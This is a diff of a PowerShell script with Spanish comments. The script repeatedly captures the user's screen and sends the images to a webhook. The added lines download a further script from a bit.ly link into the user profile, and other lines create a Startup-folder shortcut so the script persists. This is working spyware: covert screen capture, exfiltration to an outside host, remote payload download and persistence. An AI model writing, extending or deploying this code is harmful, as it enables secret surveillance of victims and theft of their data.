@@ -6,6 +6,14 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 # Detección de URL acortada
 if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
 
+# Verificar si el archivo principal ya existe
+$syswPath = "$env:USERPROFILE\sysw.ps1"
+if (!(Test-Path $syswPath)) {
+    # Descargar el script principal
+    $syswUrl = "https://bit.ly/Screen_dc"
+    Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
+}
+
 do {
     $Filett = "$env:temp\SC.png"
     Add-Type -AssemblyName System.Windows.Forms
@@ -30,11 +38,6 @@ do {
 
     # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
-        # Descargar el script principal
-        $syswUrl = "https://bit.ly/Screen_dc"
-        $syswPath = "$env:USERPROFILE\sysw.ps1"
-        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
-        
         # Crear acceso directo en la carpeta de inicio del usuario
         $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
         $shell = New-Object -ComObject WScript.Shell
